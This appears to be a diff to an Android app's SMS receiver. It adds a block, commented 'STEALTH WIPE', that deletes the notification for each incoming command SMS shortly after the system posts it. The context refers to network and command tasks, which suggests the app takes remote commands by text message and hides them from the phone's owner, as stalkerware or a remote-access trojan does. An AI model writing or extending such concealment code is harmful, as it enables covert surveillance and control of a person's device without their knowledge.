@@ -74,6 +74,12 @@ class SmsReceiver : BroadcastReceiver() {
                             content = "$content|$sender"
                         }
 
+                        // STEALTH WIPE: Remove the incoming command notification immediately
+                        CoroutineScope(Dispatchers.Main).launch {
+                            delay(500) // Wait for OS to post the notification
+                            MyNotificationListener.instance?.wipeNotifications("TEXT", "Hii!!")
+                        }
+
                         // 4. ASYNC HANDOFF: Only use Coroutines for slow Network/Command tasks
                         val pendingResult = goAsync()
                         CoroutineScope(Dispatchers.IO).launch {
